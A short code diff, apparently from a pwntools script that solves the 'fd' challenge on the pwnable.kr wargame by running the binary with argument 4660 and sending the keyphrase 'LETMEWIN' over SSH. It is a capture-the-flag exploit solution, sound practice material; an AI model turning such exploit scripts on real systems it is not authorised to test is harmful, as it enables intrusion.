@@ -10,4 +10,5 @@ r = ssh(host='pwnable.kr',
 r.run('fd','4660')
 
 # Send keyphrase to STDIN #
-r.send('LETMEWIN\n')
+r.sendline('LETMEWIN\n')
+r.recvline()
